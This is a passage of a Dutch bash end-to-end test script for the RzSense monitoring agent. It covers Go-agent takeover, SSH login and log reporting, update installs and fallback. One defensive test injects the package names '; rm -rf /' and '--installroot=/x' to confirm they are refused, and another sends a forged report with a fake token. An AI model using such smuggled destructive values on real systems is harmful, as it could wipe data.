[ "$got" = '[false,[],[],true]' ] || fail "vóór 60 proefrondes hoort alleen de proef het overnemen tegen te houden: $got"
got=$(take '$r = AgentTakeover::request($id, true); echo isset($r["error"]) ? "geweigerd" : "aangenomen";')
[ "$got" = geweigerd ] || fail "overnemen werd aangenomen terwijl de proef nog te kort liep"
echo "✔ overnemen kan pas na een lange genoeg proef (en RzSense zegt waarom)"
# De proef "een uur" laten lopen, en dan vragen
take '$s = AgentData::get($id, "shadow"); $s["rounds"] = 60; $s["rounds_ok"] = 60; AgentData::put($id, "shadow", $s); $r = AgentTakeover::request($id, true); if (isset($r["error"])) { fwrite(STDERR, $r["error"] . "\n"); exit(1); }' || fail "overnemen werd geweigerd na een goede proef"
out=$("$work/rzsense" shadow 2>&1) || fail "de proefronde met de overname mislukte: $out"
grep -q 'Overgenomen' <<<"$out" || fail "de Go-agent nam niet over: $out"
[ "$(cat "$work/data/mode")" = active ] || fail "de Go-agent staat niet op actief: $(cat "$work/data/takeover.last") / $(tail -5 "$work/systemctl.log" | tr "\n" ";")"
if [ -e "$work/units/rzmon-agent.timer" ] || [ -e "$work/units/rzmon-agent-guard.timer" ]; then fail "de timers van de bash-agent staan nog aan"; fi
[ -s "$work/data/tests.cache" ] || fail "de Go-agent haalde de testlijst niet zelf op"
got=$(take '$h = q("SELECT os, agent_version, agent_seen, enc_seen FROM hosts WHERE id = ?", [$id])->fetch(); $c = AgentTakeover::check($id);
echo implode(" ", [$h["os"], $h["agent_version"], $h["enc_seen"], strtotime((string) $h["agent_seen"]) > time() - 60 ? "vers" : "oud", $c["active"] ? "actief" : "proef", agent_latest($h["os"]),
    strtotime((string) q("SELECT updated_at FROM agent_data WHERE host_id = ? AND metric = ?", [$id, "cpu"])->fetchColumn()) > time() - 60 ? "cpu" : "geen-cpu"]);')
v=$(tr -d '[:space:]' < agent-win/VERSION)
[ "$got" = "linux-go $v 1 vers actief $v cpu" ] || fail "RzSense nam het echte rapport niet aan zoals verwacht: $got"
echo "✔ overgenomen: de timers van de bash-agent staan uit, RzSense kreeg het echte rapport van de Go-agent"
"$work/rzsense" shadow --quiet || fail "de volgende ronde van de Go-agent mislukte"
grep -q 'doet het werk' <<<"$("$work/rzsense" status)" || fail "rzsense status zegt niet dat de Go-agent het werk doet"
[ "$(cat "$work/keys/agent.key")" = "$key" ] || fail "de sleutel van de bash-agent is veranderd"
echo "✔ de Go-agent rapporteert elke ronde; de sleutel van de bash-agent is ongemoeid"

# Logins: een nieuwe regel in het auth-log komt bij RzSense aan; wat er al stond niet, en niets komt dubbel
printf '%s\n' "Oct 21 10:05:00 nas sshd[77]: Accepted publickey for rehman from 192.168.2.5 port 51544 ssh2: ED25519 SHA256:abc" \
    "Oct 21 10:05:01 nas sshd[78]: Failed password for root from 203.0.113.7 port 50212 ssh2" >>"$work/auth.log"
"$work/rzsense" shadow --quiet || fail "de ronde met logins mislukte"
"$work/rzsense" shadow --quiet || fail "de ronde na de logins mislukte"
got=$(take 'echo implode(" ", array_map(static fn($r) => ($r["ok"] ? "ok" : "fail") . ":" . $r["username"] . ":" . $r["port"], q("SELECT ok, username, port FROM ssh_events WHERE host_id = ? ORDER BY id", [$id])->fetchAll()));')
[ "$got" = "ok:rehman:51544 fail:root:50212" ] || fail "de logins kwamen niet (of dubbel, of met oude regels) aan bij RzSense: $got"
grep -q '^file|[0-9]*|[0-9]*$' "$work/cache/authstate" || fail "de stand van de logins staat niet in het bestand van de bash-agent"
echo "✔ logins: een gelukte en een mislukte SSH-login kwamen één keer aan; de stand staat in het bestand van de bash-agent"

# Een onversleuteld rapport dat zich voordoet als de Go-agent wordt geweigerd
code=$(curl -s -o /dev/null -w '%{http_code}' -X POST -H 'Content-Type: application/json' -H "X-Agent-Token: nep" --data '{"go":1,"os":"linux","agent_version":"9.9.9"}' "$BASE/api.php?action=agent")
[ "$code" != 200 ] || fail "een rapport zonder sleutel werd aangenomen"

# Logs (1.350.0): een log-check en een bron om te verzamelen; nieuwe regels komen als treffer en als pakketje bij RzSense
export APPLOG="$work/applog/app.log"
take 'q("DELETE FROM log_sources WHERE host_id = ?", [$id]); q("INSERT INTO log_sources (host_id, name, kind, spec, level) VALUES (?, ?, ?, ?, 0)", [$id, "app", "file", getenv("APPLOG")]);
q("INSERT INTO checks (host_id, name, type, target, options, interval_sec, enabled) VALUES (?, ?, ?, ?, ?, 60, 1)", [$id, "fouten", "log", getenv("APPLOG"), json_encode(["pattern" => "fout"])]);' || fail "kon de logbron niet aanmaken"
"$work/rzsense" shadow --quiet || fail "de ronde met de nieuwe logbron mislukte"
"$work/rzsense" shadow --quiet || fail "de eerste ronde met logs mislukte"
printf 'een fout van 203.0.113.7\ngewoon\nnog een FOUT\n' >>"$work/applog/app.log"
rm -f "$work/keys/logship/last"
find "$work/cache/logstate" -type f -exec touch -d '5 minutes ago' {} +   # de check is weer aan de beurt
"$work/rzsense" shadow --quiet || fail "de ronde met nieuwe logregels mislukte"
got=$(take '$c = (int) q("SELECT id FROM checks WHERE host_id = ? AND type = ?", [$id, "log"])->fetchColumn(); $r = AgentData::get($id, "logrun:" . $c);
echo array_sum(array_map(static fn($h) => (int) ($h[1] ?? 0), (array) ($r["hist"] ?? []))) . " " . (int) q("SELECT COUNT(*) FROM log_batches WHERE host_id = ?", [$id])->fetchColumn() . " " . (string) q("SELECT status FROM log_sources WHERE host_id = ?", [$id])->fetchColumn();')
case "$got" in "2 "[1-9]*" ok") ;; *) fail "de logs kwamen niet goed aan bij RzSense (treffers, pakketjes, status van de bron): $got" ;; esac
[ -z "$(ls "$work/keys/logship/"b*.gz 2>/dev/null)" ] || fail "een bevestigd pakketje bleef in de wachtrij staan"
[ "$(cat "$work/keys/agent.key")" = "$key" ] || fail "de sleutel is veranderd door de logs"
echo "✔ logs: 2 treffers van de log-check en de pakketjes kwamen bij RzSense aan; de wachtrij is leeg"

# Heartbeats (1.351.0): een regel van rzmon-hb gaat mee met het rapport en verdwijnt pas als RzSense hem heeft
HB_DIR="$work/hbq" bash agent/rzmon-agent.sh --hb e2e-taak ok "klaar" || fail "rzmon-hb faalde"
[ "$(find "$work/hbq" -name 'hb.*' -type f | wc -l)" = 1 ] || fail "rzmon-hb zette geen regel in de wachtrij"
"$work/rzsense" shadow --quiet || fail "de ronde met een heartbeat mislukte"
[ "$(find "$work/hbq" -name 'hb.*' -type f | wc -l)" = 0 ] || fail "de heartbeat bleef in de wachtrij staan nadat RzSense het rapport aannam"
grep -q 'e2e-taak' "$work/data/hb.unknown" || fail "RzSense meldde niet dat er geen check met die naam is (of de Go-agent bewaarde het niet)"
echo "✔ heartbeats: de regel van rzmon-hb ging mee en is uit de wachtrij; RzSense meldt dat er nog geen check met die naam is"

# Softwarelijst (1.347.0): de hele lijst ging één keer mee; daarna alleen het controlegetal
got=$(take '$v = q("SELECT mgr, packages, hash FROM vuln_inventory WHERE host_id = ?", [$id])->fetch(); echo $v ? ((count((array) json_decode((string) $v["packages"], true)) > 50 ? "lijst" : "leeg") . " " . (preg_match("/^[0-9a-f]{16}$/", (string) $v["hash"]) ? "hash" : "geen-hash")) : "niets";')
[ "$got" = "lijst hash" ] || fail "de softwarelijst kwam niet bij RzSense aan: $got $(head -c 300 "$work/data/pkgs.json")"
[ -s "$work/data/pkgs.sent" ] || fail "de Go-agent onthield niet dat RzSense de softwarelijst heeft (zou hem elke minuut opnieuw sturen)"
echo "✔ softwarelijst: aangekomen bij RzSense; daarna gaat alleen het controlegetal mee"

# Realtime (1.361.0, Go-agent 0.30.0): staat het in RzSense aan, dan vraagt de Go-agent zijn eigen watcher aan; die start
# bij een login meteen een ronde, en RzSense krijgt de stand van de watcher. Gaat het uit, dan stopt de watcher.
export RZ_E2E_WORK="$work" RZSENSE_TEST_WATCH=1
take 'q("UPDATE hosts SET realtime = 1 WHERE id = ?", [$id]);'
"$work/rzsense" shadow --quiet || fail "de ronde na het aanzetten van Realtime mislukte"
"$work/rzsense" shadow --quiet || fail "de ronde met de nieuwe testlijst mislukte"
grep -q "$(printf '^0\trealtime\t1')" "$work/data/tests.cache" || fail "de regel voor Realtime staat niet in de testlijst van de Go-agent"
grep -q 'rzsense-watch.service.* watch$' "$work/systemd-run.log" 2>/dev/null || fail "de Go-agent vroeg zijn watcher niet aan: $(cat "$work/systemd-run.log" 2>/dev/null)"
printf '#!/bin/sh\nsleep 2\necho "Nov 27 10:00:00 host sshd[4123]: Accepted password for piet from 192.0.2.5 port 50022 ssh2"\nsleep 600\n' >"$work/bin/journalctl"; chmod 755 "$work/bin/journalctl"
before=$(cat "$work/data/last_ok")
sleep 1
"$work/rzsense" watch & w_pid=$!
disown "$w_pid" 2>/dev/null || true
(sleep 3; echo "Nov 27 10:00:01 host sshd[4124]: Accepted password for piet from 192.0.2.5 port 50023 ssh2" >>"$work/auth.log") &
for _ in $(seq 1 40); do
    [ "$(cat "$work/data/last_ok")" != "$before" ] && grep -q '^active ' "$work/data/watch.state" 2>/dev/null && break
    sleep 0.5
done
state=$(cat "$work/data/watch.state" 2>/dev/null); after=$(cat "$work/data/last_ok")
kill "$w_pid" 2>/dev/null || true
[ "$after" != "$before" ] || fail "de watcher startte geen ronde na een login (stand: $state)"
case "$state" in "active "*" ok "*) ;; *) fail "de watcher meldt een onverwachte stand: $state" ;; esac
"$work/rzsense" shadow --quiet || fail "de ronde na de watcher mislukte"
got=$(take 'echo (string) q("SELECT value FROM agent_data WHERE host_id = ? AND metric = ?", [$id, "realtime"])->fetchColumn();')
grep -q '"state":"\(active\|off\)"' <<<"$got" && grep -q '"journal"' <<<"$got" || fail "RzSense kreeg de stand van de watcher niet: $got"
for _ in $(seq 1 20); do grep -q '^off ' "$work/data/watch.state" && break; sleep 0.25; done
grep -q '^off ' "$work/data/watch.state" || fail "de watcher hoort bij stoppen zijn stand op uit te zetten: $(cat "$work/data/watch.state")"
take 'q("UPDATE hosts SET realtime = 0 WHERE id = ?", [$id]);'
"$work/rzsense" shadow --quiet && "$work/rzsense" shadow --quiet || fail "de ronde na het uitzetten van Realtime mislukte"
[ ! -e "$work/units/rzsense-watch.service" ] && [ -e "$work/gestopt.rzsense-watch.service" ] || fail "na het uitzetten van Realtime hoort de Go-agent zijn watcher te stoppen"
unset RZSENSE_TEST_WATCH
echo "✔ Realtime: de Go-agent vraagt zijn eigen watcher aan, een login start meteen een ronde, RzSense krijgt de stand, en uitzetten stopt de watcher"

# Updates (1.346.0): de lijst kwam met het echte rapport mee; op verzoek installeert de Go-agent en meldt hij de uitkomst
got=$(take '$p = AgentData::get($id, "patch"); echo ($p["mgr"] ?? "?") . " " . ($p["avail"] ?? "?") . " " . ($p["sec"] ?? "?") . " " . (empty($p["rb"]) ? "nee" : "herstart");')
[ "$got" = "rpm 4 2 herstart" ] || fail "de lijst met updates kwam niet bij RzSense aan: $got"
take 'q("UPDATE hosts SET vuln_upgrade_req = ?, vuln_upgrade_status = NULL WHERE id = ?", [json_encode(["id" => "abcdef0123456789", "pkgs" => [], "mode" => "security", "sent" => null, "by" => "test"]), $id]);'
"$work/rzsense" shadow --quiet || fail "de ronde met de opdracht 'updates installeren' mislukte"
grep -qx -- '-y upgrade --security' "$work/dnf.log" || fail "de Go-agent startte niet het vaste commando voor beveiligingsupdates: $(cat "$work/dnf.log" 2>/dev/null)"
got=$(take '$s = json_decode((string) q("SELECT vuln_upgrade_status FROM hosts WHERE id = ?", [$id])->fetchColumn(), true); echo ($s["state"] ?? "?") . " " . (str_contains((string) ($s["log"] ?? ""), "Complete!") ? "log" : "geen-log") . " " . (q("SELECT vuln_upgrade_req FROM hosts WHERE id = ?", [$id])->fetchColumn() === null ? "klaar" : "open");')
[ "$got" = "ok log klaar" ] || fail "de uitkomst van het installeren kwam niet goed aan bij RzSense: $got"
"$work/rzsense" shadow --quiet || fail "de ronde na het installeren mislukte"
[ ! -e "$work/data/upgrade.result" ] || fail "de uitkomst van het installeren bleef op de server staan (zou steeds opnieuw meegaan)"
# een opdracht die niet mag: nieuwe pakketten installeren, of een rare pakketnaam
take 'q("UPDATE hosts SET vuln_upgrade_req = ? WHERE id = ?", [json_encode(["id" => "abcdef0123456790", "pkgs" => ["; rm -rf /", "--installroot=/x"], "mode" => "", "sent" => null, "by" => "test"]), $id]);'
: >"$work/dnf.log"
"$work/rzsense" shadow --quiet || fail "de ronde met een ongeldige opdracht mislukte"
"$work/rzsense" shadow --quiet || fail "de ronde na een ongeldige opdracht mislukte"
[ ! -s "$work/dnf.log" ] || fail "een opdracht met ongeldige pakketnamen startte toch de pakketbeheerder: $(cat "$work/dnf.log")"
got=$(take '$s = json_decode((string) q("SELECT vuln_upgrade_status FROM hosts WHERE id = ?", [$id])->fetchColumn(), true); echo $s["state"] ?? "?";')
[ "$got" = error ] || fail "een geweigerde opdracht is niet als mislukt gemeld: $got"
echo "✔ updates: de lijst kwam aan, beveiligingsupdates installeren gaf voortgang en uitkomst, een ongeldige opdracht start niets"

# Terug op verzoek: RzSense zegt het in het antwoord, de timers gaan weer aan
take 'AgentTakeover::request($id, false);'
"$work/rzsense" shadow --quiet || fail "de ronde met 'terug' mislukte"
[ "$(cat "$work/data/mode")" = shadow ] || fail "de Go-agent ging niet terug naar proef"
{ [ -e "$work/units/rzmon-agent.timer" ] && [ -e "$work/units/rzmon-agent-guard.timer" ]; } || fail "de timers van de bash-agent staan niet weer aan"
[ ! -e "$work/data/takeover.hold" ] || fail "na 'terug' op verzoek hoort er geen pauze te zijn"
echo "✔ terug op verzoek: de bash-agent staat weer aan"

# Terugval: de Go-agent doet het werk maar het rapporteren lukt niet meer (verkeerde sleutel): na 5 keer terug naar bash
echo active >"$work/data/mode"; rm -f "$work/units/"*.timer
printf '%s\n' "$(printf 'ab%.0s' $(seq 32))" >"$work/keys/agent.key"
for i in 1 2 3 4; do "$work/rzsense" shadow --quiet 2>/dev/null && fail "een rapport met een verkeerde sleutel werd aangenomen"; [ "$(cat "$work/data/mode")" = active ] || fail "al na $i mislukte rapporten terug"; done
"$work/rzsense" shadow --quiet 2>/dev/null && fail "een rapport met een verkeerde sleutel werd aangenomen"
{ [ "$(cat "$work/data/mode")" = shadow ] && [ -e "$work/units/rzmon-agent.timer" ]; } || fail "na 5 mislukte rapporten ging de bash-agent niet weer aan"
[ -s "$work/data/takeover.hold" ] || fail "na een terugval hoort er een pauze van een uur te zijn"
grep -q '5 rapporten achter elkaar mislukt' "$work/data/takeover.last" || fail "de reden van de terugval is niet bewaard"
printf '%s\n' "$key" >"$work/keys/agent.key"
echo "✔ terugval: na 5 mislukte rapporten doet de bash-agent het werk weer, met de reden erbij"

# Het bewakertje (shellscript uit install-rzsense.sh): doet de Go-agent het werk en kwam er 10 minuten niets aan, dan terug
sed -n "/^    cat >\"\$FALLBACK_BIN\" <<'EOS'\$/,/^EOS\$/p" agent/install-rzsense.sh | sed '1d;$d' >"$work/fallback.sh"
grep -q 'rzmon-agent.timer' "$work/fallback.sh" || fail "het bewakertje is niet uit install-rzsense.sh te halen"
echo active >"$work/data/mode"; rm -f "$work/units/"*.timer; date +%s >"$work/data/last_ok"
RZSENSE_DATA="$work/data" sh "$work/fallback.sh"
{ [ "$(cat "$work/data/mode")" = active ] && [ ! -e "$work/units/rzmon-agent.timer" ]; } || fail "het bewakertje greep in terwijl de Go-agent net rapporteerde"
echo $(($(date +%s) - 700)) >"$work/data/last_ok"
RZSENSE_DATA="$work/data" sh "$work/fallback.sh"
{ [ "$(cat "$work/data/mode")" = shadow ] && [ -e "$work/units/rzmon-agent.timer" ]; } || fail "het bewakertje zette de bash-agent niet weer aan"
echo "✔ het bewakertje zet de bash-agent weer aan als de Go-agent 10 minuten niets meldt"
